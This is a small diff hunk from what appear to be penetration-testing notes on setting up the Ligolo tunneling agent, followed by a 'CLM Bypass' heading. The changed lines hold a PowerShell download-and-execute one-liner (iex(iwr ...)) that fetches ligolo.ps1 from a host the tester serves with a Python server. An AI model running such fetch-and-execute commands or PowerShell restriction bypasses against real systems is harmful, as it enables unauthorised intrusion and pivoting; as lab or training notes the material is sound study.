@@ -16,7 +16,7 @@ CMD:
 4. make sure both `ligolo.ps1` and `agent.bin` in the same directory, then serve them by simply using python server.
 
 5. Invoke the script:
-- `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
+- `iex(iwr http://192.168.45.173/ligolo.ps1 -UseBasicParsing)`
 
 ## CLM Bypass
 
